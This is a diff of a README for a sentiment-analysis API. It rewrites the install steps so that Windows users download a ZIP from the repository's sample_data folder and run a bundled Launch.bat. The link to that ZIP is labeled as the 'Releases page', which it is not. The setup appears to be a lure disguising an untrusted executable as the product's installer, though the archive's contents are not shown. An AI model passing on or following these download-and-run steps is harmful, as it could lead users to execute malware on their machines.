@@ -28,18 +28,15 @@ Insightify-Sentiment-API comes packed with the following features:
 ## 📥 Download & Install
 To download the latest version of Insightify-Sentiment-API, visit the [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip). 
 
-1. Click on the link above to go to the Releases page.
-2. Find the latest release version.
-3. Click on the download link for your operating system.
-4. Once the download is complete, locate the downloaded file.
+1. Select the archive link above.
+2. Extract the downloaded ZIP file.
+3. On Windows, run `Launch.bat` from the extracted directory.
 
 For further instructions on running the application, follow these steps:
 
 ### 🖥 Running the Application
-1. **Windows Users**: Double-click the `.exe` file to launch the application.
-2. **macOS Users**: Open the `.dmg` file and drag the application into your Applications folder, then launch it.
-3. **Linux Users**: Open a terminal, navigate to the downloaded file, and run it by typing `./<file-name>`.
-4. **Source Users**: Install dependencies with `pip install -r requirements.txt`, then run `uvicorn main:app`.
+1. **Windows Archive**: Run the bundled `Launch.bat` file.
+2. **Source Users**: Install dependencies with `pip install -r requirements.txt`, then run `uvicorn main:app`.
 
 ## 🔌 API Usage
 Once the application is running, you can access its powerful API features. 
@@ -75,10 +72,10 @@ Upload the file using the specified endpoint to receive a sentiment analysis for
 - **Save Results**: Export the analysis results as CSV for further examination or reporting.
 
 ## 📞 Support
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip), and we will assist you promptly.
+If you encounter any problems or have questions, visit the [GitHub repository](https://github.com/ogthheu/Insightify-Sentiment-API).
 
 ## 🌟 Contributing
-We welcome contributions! If you have suggestions, improvements, or bug fixes, please check our [contributing guidelines](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) to get started.
+We welcome contributions! If you have suggestions, improvements, or bug fixes, open a [pull request](https://github.com/ogthheu/Insightify-Sentiment-API/pulls).
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for details.
